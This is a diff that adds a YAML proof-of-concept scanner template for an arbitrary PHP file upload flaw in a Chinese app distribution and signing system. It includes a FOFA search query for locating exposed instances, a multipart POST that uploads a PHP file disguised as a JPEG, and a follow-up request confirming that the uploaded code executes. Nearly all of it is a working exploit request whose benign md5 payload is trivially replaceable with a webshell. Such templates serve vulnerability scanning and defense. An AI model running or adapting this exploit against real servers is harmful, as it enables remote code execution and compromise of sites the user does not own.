@@ -1,0 +1,38 @@
+id: poc-yaml-zero-degree-cloud-index-uplog-php-anyfile-upload
+info:
+  name: 零度云APP分发签名系统 index-uplog.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: APP分发签名系统
+  fofa: body="statics/css/swiper.min.css" && body="/user/messages/dialog"
+variables:
+  t1: random_int(10,100)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /source/pack/upload/2upload/index-uplog.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
+  data: '------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="time"
+
+
+    {{.t1}}-{{.t1}}
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="app"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--'
+  expression: status_code == 200 && contains(body,`'extension':'php'`)
+- method: GET
+  path: /source/data/tmp/{{.t1}}-{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
